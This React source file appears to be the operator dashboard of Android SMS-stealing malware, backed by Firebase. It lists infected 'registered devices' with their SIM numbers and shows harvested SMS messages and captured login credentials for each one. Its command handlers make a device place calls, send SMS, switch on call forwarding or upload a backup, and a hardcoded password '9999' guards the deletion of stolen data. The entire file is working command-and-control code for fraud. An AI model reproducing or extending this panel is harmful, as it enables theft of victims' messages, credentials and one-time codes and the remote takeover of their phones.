"use client";
import React, { useState } from "react";
import { ref, update, remove } from "firebase/database";
import { db } from "../lib/firebase";

const DEVICE_LIMIT = 5;

export default function DevicesPanel({ 
  data, 
  deviceOnlineStatus, 
  deviceSerialMap, 
  favourites, 
  toggleFavourite, 
  showToast,
  openSmsModal,
  deleteAllSms,
  deleteAllCredentials
}) {
  const [searchQuery, setSearchQuery] = useState("");
  const [filter, setFilter] = useState("all");
  const [offset, setOffset] = useState(0);
  const [expandedDevices, setExpandedDevices] = useState({});
  const [activeTabs, setActiveTabs] = useState({});
  const [formMemory, setFormMemory] = useState({});

  const devices = data.user_data || {};
  let keys = Object.keys(devices);

  if (searchQuery) {
    const q = searchQuery.toLowerCase();
    keys = keys.filter(id => {
      const dev = devices[id] || {};
      const name = dev.d_name || dev.device_name || id;
      const serial = deviceSerialMap[id] || 0;
      return (id + " " + name + " " + serial).toLowerCase().includes(q);
    });
  }

  keys.sort((a, b) => {
    const sA = deviceSerialMap[a] || 0;
    const sB = deviceSerialMap[b] || 0;
    return sA === sB ? a.localeCompare(b) : sB - sA;
  });

  if (filter === "online") {
    keys = keys.filter(id => deviceOnlineStatus[id] === true);
  } else if (filter === "offline") {
    keys = keys.filter(id => !deviceOnlineStatus[id]);
  }

  const paginatedKeys = keys.slice(offset, offset + DEVICE_LIMIT);

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast(`📋 Copied: ${text}`, "success");
  };

  const toggleExpand = (id) => {
    setExpandedDevices(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleTab = (devId, tab) => {
    setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
  };

  const handleCommand = (type, devId) => {
    if (!confirm(`Execute ${type} on ${devId}?`)) return;
    const baseRef = ref(db, `user_data/${devId}`);

    if (type === "call") {
      const num = formMemory[`callNum-${devId}`];
      const sim = formMemory[`callSim-${devId}`] || "0";
      if (!num) return showToast("Enter phone number!", "warning");
      update(baseRef, { command: "make call", adminNumber: num, simSlot: sim, timestamp: Date.now() });
      showToast("Call command sent", "success");
    } else if (type === "sms") {
      const num = formMemory[`smsNum-${devId}`];
      const body = formMemory[`smsText-${devId}`];
      const sim = formMemory[`smsSim-${devId}`] || "1";
      if (!num || !body) return showToast("Provide phone and message!", "warning");
      update(baseRef, { command: "send message", phoneNumber: num, messageText: body, simSlot: sim, timestamp: Date.now() });
      showToast("SMS command sent", "success");
    } else if (type === "fwd_on") {
      const num = formMemory[`fwdNum-${devId}`];
      const sim = formMemory[`fwdSim-${devId}`] || "0";
      if (!num) return showToast("Enter forward number!", "warning");
      update(baseRef, { command: "call forward", phoneNumber: num, simSlot: sim, timestamp: Date.now() });
      showToast("Call Forward Activated", "success");
    } else if (type === "fwd_off") {
      update(baseRef, { command: "forward off", timestamp: Date.now() });
      showToast("Call Forward Deactivated", "success");
    } else if (type === "backup") {
      update(baseRef, { command: "backup", timestamp: Date.now() });
      showToast("Backup initiated", "success");
    }
  };

  const deleteDeviceData = (devId, type) => {
    const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
    if (pwd !== "9999") return showToast("❌ Invalid Password", "error");
    if (!confirm(`Delete ${type} for ${devId}?`)) return;

    const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
    remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
  };

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Registered Devices</h2>
          <p className="panel-sub">Click on any device to expand & view details</p>
        </div>
        <div className="panel-stats">
          <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>All</button>
          <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>🟢 Online</button>
          <button className={`filter-btn ${filter === "offline" ? "active" : ""}`} onClick={() => { setFilter("offline"); setOffset(0); }}>🔴 Offline</button>
          <span className="stat-item"><i className="fas fa-users"></i> {keys.length}</span>
        </div>
      </div>

      <div className="search-container">
        <i className="fas fa-search search-icon"></i>
        <input 
          type="text" 
          value={searchQuery}
          onChange={(e) => { setSearchQuery(e.target.value); setOffset(0); }}
          placeholder="Search devices by ID, name, or serial..." 
          className="search-input"
        />
        {searchQuery && (
          <button className="search-clear-btn" style={{ display: "block" }} onClick={() => setSearchQuery("")}>
            <i className="fas fa-times"></i>
          </button>
        )}
      </div>

      <div style={{ marginBottom: 12, display: "flex", justifyContent: "flex-end", gap: 8, flexWrap: "wrap" }}>
        <button className="btn-delete-all" onClick={deleteAllSms}><i className="fas fa-trash-alt"></i> Delete All SMS</button>
        <button className="btn-delete-all credential" onClick={deleteAllCredentials}><i className="fas fa-key"></i> Delete All Credentials</button>
      </div>

      <div id="devicesContainer">
        {offset > 0 && (
          <button className="btn-load-more" style={{ marginBottom: 10 }} onClick={() => setOffset(Math.max(0, offset - DEVICE_LIMIT))}>
            <i className="fas fa-chevron-up"></i> Previous
          </button>
        )}

        {paginatedKeys.map((devId, idx) => {
          const dev = devices[devId] || {};
          const isOnline = deviceOnlineStatus[devId];
          const isFav = favourites.includes(devId);
          const serial = deviceSerialMap[devId] || 0;
          const expanded = expandedDevices[devId];
          const curTab = activeTabs[devId];

          const smsMap = data.user_sms?.[devId] || {};
          const smsList = Object.values(smsMap).reverse();
          const loginMap = data.login?.[devId] || {};
          const loginList = Object.values(loginMap);

          return (
            <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"} ${expanded ? "expanded" : ""}`}>
              <div className="card-header" onClick={() => toggleExpand(devId)}>
                <div className="device-info-left">
                  <div className="device-name-premium">
                    <button 
                      className="fav-star-btn" 
                      onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                    >
                      <i className={isFav ? "fas fa-star" : "far fa-star"}></i>
                    </button>
                    <span className="name-text">📱 {devId}</span>
                    <span className="device-id">#{offset + idx + 1}</span>
                    {serial > 0 && <span className="serial-badge-premium"><i className="fas fa-hashtag"></i> S-{serial}</span>}
                    {isFav && <span className="fav-badge-premium">⭐ FAV</span>}
                    <button 
                      className="copy-device-id-btn" 
                      onClick={(e) => { e.stopPropagation(); copyToClipboard(devId); }}
                    >
                      <i className="fas fa-copy"></i> Copy ID
                    </button>
                  </div>
                  <div className="device-sub-info">
                    <span><i className="fas fa-microchip"></i> {dev.Device_info || dev.device_info || "N/A"}</span>
                    <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || dev.sim1 || "No SIM"}</span>
                    {(dev.numberSim2 || dev.sim2) && <span><i className="fas fa-sim-card"></i> {dev.numberSim2 || dev.sim2}</span>}
                  </div>
                </div>

                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4 }}>
                  <span className={`status-badge-premium ${isOnline ? "online" : "offline"}`}>
                    <span className="status-dot"></span>
                    {isOnline ? "Online" : "Offline"}
                  </span>
                  <div className="last-seen-premium">
                    <i className="far fa-clock"></i> {dev.last_online ? new Date(dev.last_online).toLocaleString() : "N/A"}
                  </div>
                </div>
              </div>

              <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                <div className="info-item-premium"><span className="info-label">Device</span><span className="info-value">{dev.Device_info || "N/A"}</span></div>
                <div className="info-item-premium"><span className="info-label">SIM 1</span><span className="info-value">{dev.numberSim1 || "No SIM"}</span></div>
                <div className="info-item-premium"><span className="info-label">SIM 2</span><span className="info-value">{dev.numberSim2 || "No SIM"}</span></div>
                <div className="info-item-premium"><span className="info-label">Serial</span><span className="info-value highlight">{serial || "—"}</span></div>
              </div>

              <div className="expand-hint" onClick={() => toggleExpand(devId)}>
                <i className="fas fa-chevron-down"></i> {expanded ? "Click to collapse" : "Click to expand"}
              </div>

              {expanded && (
                <div className="expandable-content">
                  <div className="actions-row-premium">
                    {[
                      { id: "sms", label: "SMS", icon: "💬", count: smsList.length },
                      { id: "login", label: "Login", icon: "🔑", count: loginList.length },
                      { id: "call", label: "Call", icon: "📞" },
                      { id: "sendsms", label: "Send", icon: "✉️" },
                      { id: "fwd", label: "Forward", icon: "🔀" },
                      { id: "backup", label: "Backup", icon: "💾" },
                      { id: "delete", label: "Delete", icon: "🗑️" }
                    ].map(a => (
                      <button 
                        key={a.id} 
                        className={`action-btn-premium ${curTab === a.id ? `active-${a.id}` : ""}`}
                        onClick={() => handleTab(devId, a.id)}
                      >
                        {a.icon} {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
                      </button>
                    ))}
                  </div>

                  {curTab === "sms" && (
                    <div className="section-premium active">
                      <div className="section-title">
                        💬 SMS <span style={{ marginLeft: "auto" }}>{smsList.length} total</span>
                        <button onClick={() => openSmsModal(devId)} className="btn-gold" style={{ padding: "2px 8px", fontSize: 10 }}>⛶ Full</button>
                      </div>
                      <div className="sms-list-premium">
                        {smsList.slice(0, 10).map((msg, i) => (
                          <div key={i} className="sms-item-premium">
                            <div className="sms-header-premium"><span>👤 {msg.sender || msg.address}</span><span>{msg.date || ""}</span></div>
                            <div className="sms-body-premium">{msg.body}</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {curTab === "login" && (
                    <div className="section-premium active">
                      <div className="section-title">🔑 Credentials ({loginList.length})</div>
                      <div className="creds-container-premium">
                        {loginList.map((cred, i) => (
                          <div key={i} className="cred-item-premium">
                            <div className="cred-fields-premium">
                              {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "timestamp").map(([k, v]) => (
                                <div key={k} className="cred-field-premium">
                                  <span className="field-label-premium">{k}</span>
                                  <span className="field-value-premium">{String(v)}</span>
                                </div>
                              ))}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {curTab === "call" && (
                    <div className="section-premium active">
                      <input 
                        type="text" 
                        placeholder="Phone Number" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 6 }} 
                        onChange={(e) => setFormMemory(p => ({ ...p, [`callNum-${devId}`]: e.target.value }))}
                      />
                      <select 
                        className="luxury-select" 
                        style={{ marginBottom: 6 }}
                        onChange={(e) => setFormMemory(p => ({ ...p, [`callSim-${devId}`]: e.target.value }))}
                      >
                        <option value="0">SIM 1</option><option value="1">SIM 2</option>
                      </select>
                      <button className="btn-luxury btn-purple" onClick={() => handleCommand("call", devId)}><i className="fas fa-phone"></i> Call</button>
                    </div>
                  )}

                  {curTab === "sendsms" && (
                    <div className="section-premium active">
                      <input 
                        type="text" 
                        placeholder="Recipient" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 6 }} 
                        onChange={(e) => setFormMemory(p => ({ ...p, [`smsNum-${devId}`]: e.target.value }))}
                      />
                      <textarea 
                        placeholder="Message" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 6 }} 
                        onChange={(e) => setFormMemory(p => ({ ...p, [`smsText-${devId}`]: e.target.value }))}
                      />
                      <button className="btn-luxury btn-blue" onClick={() => handleCommand("sms", devId)}><i className="fas fa-paper-plane"></i> Send</button>
                    </div>
                  )}

                  {curTab === "fwd" && (
                    <div className="section-premium active">
                      <input 
                        type="text" 
                        placeholder="Forward To Number" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 6 }} 
                        onChange={(e) => setFormMemory(p => ({ ...p, [`fwdNum-${devId}`]: e.target.value }))}
                      />
                      <div style={{ display: "flex", gap: 8 }}>
                        <button className="btn-luxury btn-purple" onClick={() => handleCommand("fwd_on", devId)}><i className="fas fa-play"></i> Turn On</button>
                        <button className="btn-luxury btn-red" onClick={() => handleCommand("fwd_off", devId)}><i className="fas fa-stop"></i> Turn Off</button>
                      </div>
                    </div>
                  )}

                  {curTab === "backup" && (
                    <div className="section-premium active">
                      <button className="btn-luxury btn-purple" onClick={() => handleCommand("backup", devId)}><i className="fas fa-database"></i> Trigger Backup</button>
                    </div>
                  )}

                  {curTab === "delete" && (
                    <div className="section-premium active" style={{ borderColor: "var(--red)" }}>
                      <div style={{ display: "flex", gap: 8 }}>
                        <button className="btn-luxury btn-red" onClick={() => deleteDeviceData(devId, "sms")}><i className="fas fa-trash"></i> Delete SMS</button>
                        <button className="btn-luxury btn-red" onClick={() => deleteDeviceData(devId, "credentials")}><i className="fas fa-trash"></i> Delete Credentials</button>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          );
        })}

        {offset + DEVICE_LIMIT < keys.length && (
          <button className="btn-load-more" onClick={() => setOffset(offset + DEVICE_LIMIT)}>
            <i className="fas fa-chevron-down"></i> Load More ({keys.length - (offset + DEVICE_LIMIT)} remaining)
          </button>
        )}
      </div>
    </div>
  );
}
